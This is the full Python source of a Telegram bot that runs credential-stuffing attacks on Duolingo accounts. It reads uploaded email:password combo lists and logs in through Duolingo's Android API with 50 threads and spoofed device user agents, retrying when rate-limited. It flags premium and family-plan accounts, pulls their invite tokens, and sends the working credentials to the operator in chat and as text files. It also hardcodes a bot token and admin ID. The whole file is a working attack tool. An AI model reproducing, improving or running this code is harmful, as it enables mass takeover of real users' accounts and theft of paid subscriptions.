import telebot
import requests
import json
import time
import uuid
import logging
import threading
import signal
import sys
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError

# ========== CONFIGURATION ==========
BOT_TOKEN = "8689449943:AAHFZdaE4L0TkH6S9BAAtmdWbwoTJYyzcJQ"
ADMIN_ID = 8770379893
MAX_THREADS = 50
PROGRESS_UPDATE_INTERVAL = 500  # 500 combos per update (Telegram flood control)
BATCH_SIZE = 50000  # 50k per batch (memory efficient)
# ===================================

logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO, datefmt='%H:%M:%S')

bot = telebot.TeleBot(BOT_TOKEN)

checking_active = False
stop_flag = False
current_batch = 0
total_batches = 0

# Store all hits
all_super_hits = []
all_family_hits = []
all_free_accounts = []
super_count = 0
family_count = 0
free_count = 0
fail_count = 0
error_count = 0
error_types = {}

def signal_handler(sig, frame):
    global stop_flag
    print("\n🛑 Received interrupt, stopping...")
    stop_flag = True
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def get_headers(ua, jwt=None):
    headers = {
        "User-Agent": ua,
        "Pragma": "no-cache",
        "Accept-Encoding": "gzip",
        "Accept-Language": "en-US,en;q=0.8",
        "Host": "android-api.duolingo.cn",
        "X-Amzn-Trace-Id": "User=0"
    }
    if jwt:
        headers["Authorization"] = f"Bearer {jwt}"
        headers["Accept"] = "application/json"
        headers["Connection"] = "Keep-Alive"
    return headers

def generate_ua():
    versions = ["10", "11", "12", "13", "14"]
    models = ["SM-G991B", "Pixel 6", "OnePlus 9", "Xiaomi Mi 11", "Pixel 7 Pro"]
    return f"Dalvik/2.1.0 (Linux; U; Android {versions[hash(str(time.time())) % len(versions)]}; {models[hash(str(time.time())) % len(models)]} Build/RP1A.200720.012)"

def is_premium_account(data):
    shop_items = data.get("shopItems", [])
    for item in shop_items:
        family_info = item.get("familyPlanInfo", {})
        if family_info and family_info.get("inviteToken"):
            return True, "FAMILY", family_info.get("inviteToken")
    
    for item in shop_items:
        sub_info = item.get("subscriptionInfo", {})
        if sub_info:
            product_id = sub_info.get("productId", "")
            if "trial" in product_id.lower():
                continue
            if product_id and product_id != "N/A":
                return True, "SUPER", None
    
    if data.get("has_item_premium_subscription") == True:
        return True, "SUPER", None
    
    if data.get("hasPlus") == True:
        return True, "SUPER", None
    
    sub_configs = data.get("subscriptionConfigs", [])
    for sub in sub_configs:
        if sub.get("productId") and "trial" not in sub.get("productId", "").lower():
            return True, "SUPER", None
    
    return False, "FREE", None

def extract_subscription_details(data, plan_type):
    details = {
        "product_id": "Unknown",
        "renewing": "Unknown",
        "expiry": "Unknown",
        "invite_token": None
    }
    
    shop_items = data.get("shopItems", [])
    for item in shop_items:
        sub_info = item.get("subscriptionInfo", {})
        if sub_info:
            if sub_info.get("productId"):
                details["product_id"] = sub_info.get("productId")
            if sub_info.get("renewing") is not None:
                details["renewing"] = "Yes" if sub_info.get("renewing") else "No"
            if sub_info.get("expectedExpiration"):
                expiry_ms = sub_info.get("expectedExpiration")
                details["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
        
        family_info = item.get("familyPlanInfo", {})
        if family_info and family_info.get("inviteToken"):
            details["invite_token"] = family_info.get("inviteToken")
    
    return details

def check_single_account(email, password):
    """Single account check - with retry logic"""
    session = requests.Session()
    ua = generate_ua()
    
    for attempt in range(2):  # 2 attempts max
        try:
            login_url = "https://android-api.duolingo.cn/2017-06-30/login?fields=id"
            distinct_id = str(uuid.uuid4())
            
            login_payload = {
                "distinctId": distinct_id,
                "identifier": email,
                "password": password
            }
            
            login_headers = get_headers(ua)
            login_headers["Content-Type"] = "application/json"
            
            resp = session.post(login_url, json=login_payload, headers=login_headers, timeout=20)
            
            if resp.status_code == 429:  # Rate limit
                time.sleep(2)
                continue
                
            if resp.status_code != 200:
                return email, password, "FAIL", "wrong credentials", None
            
            login_data = resp.json()
            user_id = login_data.get("id")
            if not user_id:
                return email, password, "FAIL", "no user id", None
            
            jwt_token = None
            for cookie in session.cookies:
                if cookie.name == "jwt_token":
                    jwt_token = cookie.value
                    break
            
            if not jwt_token:
                return email, password, "FAIL", "no jwt token", None
            
            # Profile with all fields
            profile_url = f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}?fields=shopItems%2CtotalXp%2CstreakData%2Cusername%2CfromLanguage%2ClearningLanguage%2CgemsConfig%2ChasPlus%2Chas_item_premium_subscription%2CsubscriptionConfigs%2CplusDiscounts%2CcreatedAt"
            
            profile_headers = get_headers(ua, jwt_token)
            
            resp2 = session.get(profile_url, headers=profile_headers, timeout=20)
            
            if resp2.status_code == 429:
                time.sleep(2)
                continue
                
            if resp2.status_code != 200:
                return email, password, "FAIL", f"profile error {resp2.status_code}", None
            
            data = resp2.json()
            
            # Extract basic info
            username = data.get("username", "N/A")
            total_xp = data.get("totalXp", 0)
            streak = data.get("streakData", {}).get("length", 0) if data.get("streakData") else 0
            learning_lang = data.get("learningLanguage", "N/A")
            from_lang = data.get("fromLanguage", "N/A")
            
            # Get createdAt
            created_at_raw = data.get("createdAt", None)
            if created_at_raw:
                try:
                    if isinstance(created_at_raw, (int, float)):
                        created_date = datetime.fromtimestamp(created_at_raw / 1000).strftime("%Y-%m-%d")
                    else:
                        created_date = str(created_at_raw)[:10]
                except:
                    created_date = "Unknown"
            else:
                created_date = "Unknown"
            
            # Check premium
            is_premium, plan_type, invite_token = is_premium_account(data)
            
            if not is_premium:
                return email, password, "FREE", f"{username}|XP:{total_xp}|Streak:{streak}|Created:{created_date}", None
            
            # Get subscription details
            sub_details = extract_subscription_details(data, plan_type)
            if invite_token:
                sub_details["invite_token"] = invite_token
            
            # Build result
            if plan_type == "FAMILY":
                result = f"""
👨‍👩‍👧 **FAMILY PREMIUM HIT!**

📊 **ACCOUNT:**
├─ Email: `{email}:{password}`
├─ Username: `{username}`
├─ Total XP: `{total_xp:,}`
├─ Streak: `{streak} days` 🔥
├─ Learning: `{learning_lang}` (from `{from_lang}`)
├─ Created: `{created_date}`
└─ Plan: 👨‍👩‍👧 **FAMILY PLAN**

💎 **SUBSCRIPTION:**
├─ Product: `{sub_details['product_id']}`
├─ Renew: `{sub_details['renewing']}`
└─ Expires: `{sub_details['expiry']}`
"""
                if sub_details["invite_token"]:
                    result += f"\n🔗 **INVITE LINK:**\nhttps://www.duolingo.com/family-plan?invite={sub_details['invite_token']}"
            else:
                result = f"""
👑 **SUPER PREMIUM HIT!**

📊 **ACCOUNT:**
├─ Email: `{email}:{password}`
├─ Username: `{username}`
├─ Total XP: `{total_xp:,}`
├─ Streak: `{streak} days` 🔥
├─ Learning: `{learning_lang}` (from `{from_lang}`)
├─ Created: `{created_date}`
└─ Plan: 👑 **SUPER PREMIUM**

💎 **SUBSCRIPTION:**
├─ Product: `{sub_details['product_id']}`
├─ Renew: `{sub_details['renewing']}`
└─ Expires: `{sub_details['expiry']}`
"""
            
            result += f"\n📱 Checked by: [ DUOLINGO ] BY ThuYa V3"
            
            return email, password, "HIT", result, plan_type
            
        except requests.exceptions.Timeout:
            if attempt == 1:
                return email, password, "ERROR", "Timeout", None
            time.sleep(1)
        except requests.exceptions.ConnectionError:
            if attempt == 1:
                return email, password, "ERROR", "Connection Error", None
            time.sleep(1)
        except Exception as e:
            if attempt == 1:
                return email, password, "ERROR", str(e)[:40], None
            time.sleep(1)
    
    return email, password, "ERROR", "Max retries", None

def make_progress_bar(percent, width=20):
    filled = int(width * percent / 100)
    bar = "▓" * filled + "░" * (width - filled)
    return f"[{bar}] {percent:.1f}%"

def save_hits_to_file(chat_id, is_final=False):
    """Save all hits to file and send"""
    global all_super_hits, all_family_hits
    
    if all_super_hits or all_family_hits:
        hit_content = f"# [ DUOLINGO ] BY ThuYa V3\n# Author: @thuyaaungzaw\n# Super Premium: {len(all_super_hits)} | Family Plan: {len(all_family_hits)}\n# Threads: {MAX_THREADS}\n\n"
        
        if all_super_hits:
            hit_content += "="*60 + "\n"
            hit_content += "👑 SUPER PREMIUM ACCOUNTS\n"
            hit_content += "="*60 + "\n\n"
            for email, pwd, result in all_super_hits:
                hit_content += f"{email}:{pwd}\n{result}\n{'-'*40}\n\n"
        
        if all_family_hits:
            hit_content += "="*60 + "\n"
            hit_content += "👨‍👩‍👧 FAMILY PLAN ACCOUNTS\n"
            hit_content += "="*60 + "\n\n"
            for email, pwd, result in all_family_hits:
                hit_content += f"{email}:{pwd}\n{result}\n{'-'*40}\n\n"
        
        with open("premium_hits.txt", "w", encoding="utf-8") as f:
            f.write(hit_content)
        
        with open("premium_hits.txt", "rb") as f:
            bot.send_document(chat_id, f)

def process_batch(chat_id, combos, batch_num, total_batches, progress_msg_id, batch_start_time):
    global checking_active, stop_flag
    global super_count, family_count, free_count, fail_count, error_count, error_types
    global all_super_hits, all_family_hits, all_free_accounts
    
    batch_total = len(combos)
    batch_super = 0
    batch_family = 0
    batch_free = 0
    batch_fail = 0
    batch_error = 0
    
    completed = 0
    last_update = 0
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(check_single_account, email, pwd): (email, pwd) for email, pwd in combos}
        
        for future in as_completed(futures):
            if stop_flag:
                executor.shutdown(wait=False, cancel_futures=True)
                return False
            
            email, password, status, detail, plan_type = future.result()
            completed += 1
            
            if status == "HIT":
                if plan_type == "FAMILY":
                    batch_family += 1
                    family_count += 1
                    all_family_hits.append((email, password, detail))
                else:
                    batch_super += 1
                    super_count += 1
                    all_super_hits.append((email, password, detail))
                bot.send_message(chat_id, detail, parse_mode="Markdown")
                logging.info(f"✅ {plan_type} HIT: {email}")
            elif status == "FREE":
                batch_free += 1
                free_count += 1
                all_free_accounts.append((email, password, detail))
                logging.info(f"⚠️ FREE: {email}")
            elif status == "ERROR":
                batch_error += 1
                error_count += 1
                error_types[detail] = error_types.get(detail, 0) + 1
                logging.info(f"🔴 ERROR: {email} - {detail}")
            else:
                batch_fail += 1
                fail_count += 1
                logging.info(f"❌ FAIL: {email}")
            
            # Update progress every 500 combos
            if completed - last_update >= PROGRESS_UPDATE_INTERVAL or completed == batch_total:
                last_update = completed
                overall_completed = (batch_num - 1) * BATCH_SIZE + completed
                overall_total = total_batches * BATCH_SIZE
                overall_percent = (overall_completed / overall_total) * 100
                elapsed = time.time() - batch_start_time
                
                progress_bar = make_progress_bar(overall_percent)
                
                error_summary = ""
                if error_types:
                    err_list = list(error_types.items())[:2]
                    error_summary = "\n".join([f"   ├─ {k}: {v}" for k, v in err_list])
                
                progress_text = f"""
╔════════════════════════════════════╗
║     🦉 DUOLINGO CHECKER            ║
║     BY ThuYa V3                    ║
╚════════════════════════════════════╝

⏱️ **Time:** `{elapsed:.1f}s`
📦 **Batch:** `{batch_num}/{total_batches}`

`{progress_bar}`
📍 **Checked:** `{overall_completed}/{overall_total}`
🚀 **Threads:** `{MAX_THREADS}`

┌────────────────────────────────────┐
│ 📊 RESULTS SUMMARY                 │
├────────────────────────────────────┤
│ 👑 SUPER PREMIUM   :  `{super_count}`    │
│ 👨‍👩‍👧 FAMILY PLAN   :  `{family_count}`    │
│ ⚠️ FREE ACCOUNT    :  `{free_count}`    │
│ ❌ WRONG PASS      :  `{fail_count}`    │
│ 🔴 NETWORK ERROR   :  `{error_count}`    │
└────────────────────────────────────┘
"""
                if error_summary:
                    progress_text += f"\n🔍 **Errors:**\n{error_summary}"
                
                progress_text += "\n\n_Use /stop to cancel_"
                
                try:
                    bot.edit_message_text(progress_text, chat_id, progress_msg_id, parse_mode="Markdown")
                except Exception as e:
                    logging.warning(f"Progress update failed: {e}")
    
    return True

def process_combos(chat_id, combos, message_id):
    global checking_active, stop_flag, current_batch, total_batches
    global super_count, family_count, free_count, fail_count, error_count, error_types
    global all_super_hits, all_family_hits, all_free_accounts
    
    checking_active = True
    stop_flag = False
    
    # Reset counters
    super_count = 0
    family_count = 0
    free_count = 0
    fail_count = 0
    error_count = 0
    error_types = {}
    all_super_hits = []
    all_family_hits = []
    all_free_accounts = []
    
    total = len(combos)
    total_batches = (total + BATCH_SIZE - 1) // BATCH_SIZE
    overall_start_time = time.time()
    
    # Initial message
    progress_text = f"""
╔════════════════════════════════════╗
║     🦉 DUOLINGO CHECKER            ║
║     BY ThuYa V3                    ║
╚════════════════════════════════════╝

⏱️ **Time:** `0.0s`
📦 **Batch:** `1/{total_batches}`

`[░░░░░░░░░░░░░░░░░░░░] 0.0%`
📍 **Checked:** `0/{total}`
🚀 **Threads:** `{MAX_THREADS}`

┌────────────────────────────────────┐
│ 📊 RESULTS SUMMARY                 │
├────────────────────────────────────┤
│ 👑 SUPER PREMIUM   :  `0`          │
│ 👨‍👩‍👧 FAMILY PLAN   :  `0`          │
│ ⚠️ FREE ACCOUNT    :  `0`          │
│ ❌ WRONG PASS      :  `0`          │
│ 🔴 NETWORK ERROR   :  `0`          │
└────────────────────────────────────┘

_Use /stop to cancel_
"""
    try:
        bot.edit_message_text(progress_text, chat_id, message_id, parse_mode="Markdown")
    except:
        pass
    
    # Process in batches
    for batch_num in range(1, total_batches + 1):
        if stop_flag:
            bot.send_message(chat_id, "🛑 **Stopped by user.**", parse_mode="Markdown")
            break
        
        start_idx = (batch_num - 1) * BATCH_SIZE
        end_idx = min(start_idx + BATCH_SIZE, total)
        batch_combos = combos[start_idx:end_idx]
        
        logging.info(f"📦 Processing batch {batch_num}/{total_batches} ({len(batch_combos)} combos)")
        
        batch_start_time = time.time()
        success = process_batch(chat_id, batch_combos, batch_num, total_batches, message_id, overall_start_time)
        
        if not success:
            break
        
        # Small delay between batches
        time.sleep(1)
    
    # Final summary
    elapsed = time.time() - overall_start_time
    progress_bar = make_progress_bar(100)
    
    final_summary = f"""
╔════════════════════════════════════╗
║     🦉 DUOLINGO CHECKER            ║
║     BY ThuYa V3                    ║
╚════════════════════════════════════╝

⏱️ **Time:** `{elapsed:.1f}s`

`{progress_bar}`
📍 **Checked:** `{total}/{total}`
🚀 **Threads:** `{MAX_THREADS}`

┌────────────────────────────────────┐
│ 📊 FINAL RESULTS                   │
├────────────────────────────────────┤
│ 👑 SUPER PREMIUM   :  `{super_count}`    │
│ 👨‍👩‍👧 FAMILY PLAN   :  `{family_count}`    │
│ ⚠️ FREE ACCOUNT    :  `{free_count}`    │
│ ❌ WRONG PASS      :  `{fail_count}`    │
│ 🔴 NETWORK ERROR   :  `{error_count}`    │
└────────────────────────────────────┘

💾 **Premium hits saved below 👇**
"""
    bot.send_message(chat_id, final_summary, parse_mode="Markdown")
    
    # Save and send hits
    save_hits_to_file(chat_id, is_final=True)
    
    # Send free accounts file
    if all_free_accounts:
        free_content = f"# FREE Accounts (Login Success - No Premium)\n# Total: {len(all_free_accounts)}\n\n"
        for email, pwd, detail in all_free_accounts:
            free_content += f"{email}:{pwd}\n{detail}\n{'='*50}\n\n"
        
        with open("free_accounts.txt", "w", encoding="utf-8") as f:
            f.write(free_content)
        
        with open("free_accounts.txt", "rb") as f:
            bot.send_document(chat_id, f)
    
    checking_active = False
    stop_flag = False

@bot.message_handler(commands=['start'])
def start_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ Unauthorized user.")
        return
    
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn = telebot.types.KeyboardButton("📂 Check Duolingo Premium Accounts")
    markup.add(btn)
    
    bot.reply_to(
        message,
        "👋 **Duolingo Premium Account Checker**\n\n"
        "**Config:** [ DUOLINGO ] BY ThuYa V3\n"
        "**Author:** @thuyaaungzaw\n"
        f"**Threads:** `{MAX_THREADS}` (Concurrent)\n"
        f"**Batch Size:** `{BATCH_SIZE}` combos\n\n"
        "📂 Click button below → Send combo file (email:pass)\n\n"
        "**Results:**\n"
        "👑 **SUPER PREMIUM** → Individual premium plan\n"
        "👨‍👩‍👧 **FAMILY PLAN** → Family premium + invite link\n"
        "⚠️ **FREE** → Login success, no premium\n"
        "❌ **FAIL** → Wrong credentials\n"
        "🔴 **ERROR** → Network/API issue\n\n"
        "📅 **Created Date** → Account creation date\n\n"
        "🛑 Use `/stop` to cancel",
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.message_handler(commands=['stop'])
def stop_command(message):
    global stop_flag, checking_active
    
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ Unauthorized.")
        return
    
    if checking_active:
        stop_flag = True
        bot.reply_to(message, "🛑 **Stopping...** Please wait. Saving current hits...")
        # Give time to save
        time.sleep(2)
    else:
        bot.reply_to(message, "ℹ️ No active check.")

@bot.message_handler(func=lambda m: m.text == "📂 Check Duolingo Premium Accounts")
def ask_file(message):
    if message.from_user.id != ADMIN_ID:
        return
    bot.reply_to(message, "📎 Send your **email:pass** combo file (.txt)\n\n⚠️ For large files (100k+ combos), this may take time.", parse_mode="Markdown")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    global checking_active
    
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ Unauthorized")
        return
    
    if checking_active:
        bot.reply_to(message, "⚠️ Check running. Use /stop first.")
        return
    
    status_msg = bot.reply_to(message, "📥 Downloading file...")
    
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    content = downloaded_file.decode('utf-8', errors='ignore')
    combos = []
    for line in content.split('\n'):
        line = line.strip()
        if ':' in line and line.count(':') == 1:
            email, pwd = line.split(':', 1)
            combos.append((email.strip(), pwd.strip()))
    
    if not combos:
        bot.edit_message_text("❌ No valid combos. Format: email:pass", status_msg.chat.id, status_msg.message_id)
        return
    
    bot.edit_message_text(f"📥 `{len(combos)}` combos loaded.\n🚀 Starting check with {MAX_THREADS} threads...\n📦 Batch size: {BATCH_SIZE}", status_msg.chat.id, status_msg.message_id, parse_mode="Markdown")
    
    thread = threading.Thread(target=process_combos, args=(message.chat.id, combos, status_msg.message_id))
    thread.daemon = True
    thread.start()

print("🤖 Duolingo Premium Checker Bot is running...")
print(f"Config: [ DUOLINGO ] BY ThuYa V3")
print(f"Author: @thuyaaungzaw")
print(f"Threads: {MAX_THREADS}")
print(f"Batch Size: {BATCH_SIZE}")
print(f"Progress Update Interval: {PROGRESS_UPDATE_INTERVAL} combos")
print("Features: SUPER PREMIUM | FAMILY PLAN | Created Date | Batch Processing | /stop")
bot.infinity_polling()
